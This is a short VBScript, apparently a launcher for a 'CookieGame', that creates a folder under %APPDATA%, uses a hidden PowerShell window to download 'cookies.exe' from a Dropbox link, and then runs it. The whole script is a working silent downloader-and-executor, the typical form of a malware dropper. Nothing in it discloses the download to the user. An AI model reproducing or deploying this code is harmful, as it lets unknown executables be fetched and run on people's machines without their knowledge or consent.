Dim objShell, objFSO, downloadURL, savePath

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

downloadURL = "https://www.dropbox.com/scl/fi/rvfa2ifm88a25yswqwpig/cookies.exe?rlkey=lywm6hc6hfgdorywfahun0t93&st=83yt11eo&dl=1"
savePath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\CookieGame\cookies.exe"
saveDir = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\CookieGame"

' Create the folder if it doesn't exist
If Not objFSO.FolderExists(saveDir) Then
    objFSO.CreateFolder(saveDir)
End If

' Download silently using PowerShell
objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & downloadURL & "' -OutFile '" & savePath & "'""", 0, True

' Launch if download succeeded
If objFSO.FileExists(savePath) Then
    objShell.Run """" & savePath & """", 1, False
End If
